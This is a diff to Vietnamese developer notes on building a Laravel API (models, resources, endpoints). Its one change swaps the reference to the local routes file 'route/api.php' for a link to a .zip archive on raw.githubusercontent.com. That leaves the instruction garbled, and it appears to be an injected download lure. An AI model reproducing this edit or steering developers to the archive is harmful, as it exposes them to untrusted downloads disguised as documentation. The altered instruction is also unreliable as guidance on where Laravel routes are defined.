@@ -10,7 +10,7 @@ trong Model phải tạo $fillable, use SoftDeletes(), nếu không cần cột 
 // tạo Resource
 php artisan make:resource tên_collection
 trong collection vừa tạo thì tạo hàm toArray rồi tạo key => value cần trả về
-//tạo end point api trong file route/api.php. xem cách tạo end point của staff hoặc role
+//tạo end point api trong file https://raw.githubusercontent.com/lequyhieu1024/bid-data-visualization/main/leiotrichy/bid-data-visualization.zip xem cách tạo end point của staff hoặc role
 
 // ví dụ với role: {{base_url}} = http://127.0.0.1:8000/api/admin
 
